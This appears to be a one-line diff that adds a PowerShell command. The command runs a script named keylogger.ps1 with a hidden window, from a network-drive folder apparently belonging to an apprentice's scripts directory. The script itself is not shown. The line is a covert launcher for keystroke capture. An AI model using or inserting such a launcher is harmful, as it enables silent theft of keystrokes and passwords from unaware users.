@@ -1,0 +1,1 @@
+powershell.exe -windowstyle hidden -file "W:\Pole_STS\unite_SPT\Apprenti\joseph\Scripts & Developpement\Keylogger\keylogger.ps1"
